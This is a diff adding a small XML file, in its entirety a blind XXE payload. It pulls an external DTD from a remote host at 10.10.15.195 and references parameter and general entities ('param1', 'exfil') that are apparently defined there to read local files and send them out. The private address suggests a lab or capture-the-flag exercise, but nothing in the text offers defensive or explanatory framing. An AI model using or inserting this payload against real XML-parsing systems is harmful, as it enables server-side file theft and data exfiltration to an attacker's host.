@@ -1,0 +1,8 @@
+<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ELEMENT root  ANY>
+<!ENTITY % xxe SYSTEM "http://10.10.15.195/dtd.xml">
+%xxe;
+%param1;
+]>
+<x>&exfil;</x>
